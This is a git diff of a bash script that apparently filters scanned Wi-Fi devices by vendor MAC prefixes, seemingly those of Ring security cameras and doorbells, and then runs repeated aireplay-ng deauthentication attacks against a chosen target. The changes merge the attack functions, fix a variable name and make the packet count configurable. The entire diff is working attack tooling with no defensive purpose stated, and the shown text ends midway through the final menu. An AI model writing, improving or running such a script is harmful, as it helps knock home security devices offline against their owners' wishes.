@@ -177,12 +177,11 @@ ring_filter_search
 
 clear
 
-# Pre aireplay attack function
-pre_aireplay_attack() {
+# Start aireplay attack function
+aireplay_attack() {
     bssid_mac_select() {
         printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
         grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
-
         # Function to validate if a string is a valid MAC address
         is_valid_mac() {
             local mac="$1"
@@ -193,7 +192,6 @@ pre_aireplay_attack() {
                 return 1  # Invalid MAC address
             fi
         }
-
         while true; do
             read -p "Enter BSSID of target: " BSSID
             read -p "Enter MAC of target: " MAC
@@ -272,18 +270,9 @@ pre_aireplay_attack() {
         done
         printf "Setting $INF to station mode.\n"
         sudo airmon-ng stop $INF > /dev/null 2>&1
-        printf "Setting $INMP to monitor on channel $CHNL.\n"
+        printf "Setting $ITMP to monitor on channel $CHNL.\n"
         sudo airmon-ng start $ITMP $CHNL > /dev/null 2>&1
     fi
-}
-
-# Run the pre_aireplay_attack function
-pre_aireplay_attack
-
-clear
-
-# Start aireplay attack function
-start_aireplay_attack() {
     while true; do
         printf "Attemping to dissasociate \e[1;97m$MAC\e[0m...\n"
         aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
@@ -295,7 +284,7 @@ start_aireplay_attack() {
                     [Yy]*)
                         printf "Running aireplay-ng again...\n"
                         clear
-                        aireloopout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty)
+                        aireloopout=$(sudo aireplay-ng -0 $packetct -a $BSSID -c $MAC $INF | tee /dev/tty)
                         printf "$aireloopout\n"
                         if ! echo "$aireloopout" | grep -q "No such BSSID available"; then
                             break
@@ -317,35 +306,35 @@ start_aireplay_attack() {
 }
 
 # Run the start_aireplay_attack function
-start_aireplay_attack 
-
-# Function to display the menu
-display_menu() {
-    clear
-    echo "**********************************************"
-    echo "1. Restart Script"
-    echo "2. Run Aireplay Attack Again"
-    echo "3. Quit"
-    echo "**********************************************"
-    read -p "You have reached the end of this script. Select the next option:" choice5
-}
+aireplay_attack 
 
 # End menu loop
 while true; do
+    # Function to display the menu
+    display_menu() {
+        clear
+        ascii_art
+        echo "**********************************************"
+        echo "1. Restart Script"
+        echo "2. Run Aireplay Attack Again"
+        echo "3. Quit"
+        echo "**********************************************"
+        read -p "You have reached the end of this script. Select the next option:" choice5
+    }    
     display_menu
     case "$choice5" in
         1)
             clear
             printf "Restarting the script...\n"
             sleep 2
+            sudo rm -rf /tmp/rdos > /dev/null 2>&1
             printf "Setting $INF to station mode.\n"
             sudo airmon-ng stop $INF > /dev/null 2>&1
-            printf "Setting $INMP to monitor mode.\n"
+            printf "Setting $ITMP to monitor mode.\n"
             sudo airmon-ng start $ITMP > /dev/null 2>&1
             airodump_scan
             ring_filter_search
-            pre_aireplay_attack
-            start_aireplay_attack
+            aireplay_attack
             ;;
         2)
             clear
